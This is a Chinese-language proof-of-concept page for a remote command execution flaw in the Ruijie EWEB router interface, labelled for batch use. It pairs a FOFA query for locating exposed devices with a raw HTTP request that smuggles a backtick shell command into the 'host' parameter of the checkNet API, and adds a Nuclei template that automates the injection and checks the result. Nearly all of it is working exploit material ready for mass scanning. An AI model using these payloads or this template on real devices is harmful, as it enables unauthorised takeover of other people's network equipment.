## 锐捷 EWEB auth 远程命令执行漏洞RCE（批量）

## FOFA
```
body="cgi-bin/luci" && body="#f47f3e"
```

## POC
```
POST /cgi-bin/luci/api/auth HTTP/1.1 Host: XXXXXXXXXX.com Content-Type: application/json User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 {"method":"checkNet","params":{"host":"`echo c149136B>666666.txt`"}}
```

访问http://XXXXXXXXXXXX:XXXX/cgi-bin/666666.txt


## Nuclei POC
```
id: ruijie-EWEB-auth-RCE
info:
  name: auth接口存在RCE漏洞
  author: someone
  severity: critical
  description: auth接口存在RCE漏洞，恶意攻击者可能会利用该漏洞执行恶意命令，进而导致服务器失陷。
  reference:
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="cgi-bin/luci" && body="#f47f3e"
  tags: RCE
variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /cgi-bin/luci/api/auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)   AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        
        {"method":"checkNet","params":{"host":"`echo {{666}}>{{filename}}.txt`"}}

  
      - |
        GET /cgi-bin/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
  

    matchers:
      - type: dsl
        dsl:
          - "status_code_2==200 && contains_all(body,'{{666}}')"
```
